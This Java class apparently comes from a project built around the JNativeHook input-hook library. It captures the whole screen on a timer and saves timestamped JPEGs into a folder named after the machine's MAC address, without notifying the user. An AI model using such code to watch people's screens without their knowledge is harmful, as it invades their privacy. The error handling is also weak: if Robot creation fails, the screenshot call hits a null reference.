package jnativehookexample;

import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.util.TimerTask;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.imageio.ImageIO;
/**
 * Klasa odpowiedzialna za robienie zrzutów ekranu 
 * @author PanTomek
 */
public class PrintScreen extends TimerTask{
    /**
     * Dzięki funkcji run możemy użyć wykonania kodu w ustalonym odstępie czasu
     */
    @Override
    public void run() {
      MACaddress mac = new MACaddress();
      String s =mac.getmac();
      Toolkit tool = Toolkit.getDefaultToolkit();
      Dimension d = tool.getScreenSize();
      Rectangle rect = new Rectangle(d);
      Robot robot = null;
        try {
            robot = new Robot();
        } catch (AWTException ex) {
            Logger.getLogger(PrintScreen.class.getName()).log(Level.SEVERE, null, ex);
        }

      File f = new File("C:\\Users\\PanTomek\\Desktop\\ThisOneFile\\"+s+"\\screenshot"+System.currentTimeMillis()+".jpg");
      BufferedImage img = robot.createScreenCapture(rect);
        try {
            ImageIO.write(img,"jpeg",f);
        } catch (IOException ex) {
            Logger.getLogger(PrintScreen.class.getName()).log(Level.SEVERE, null, ex);
        }
    


}
}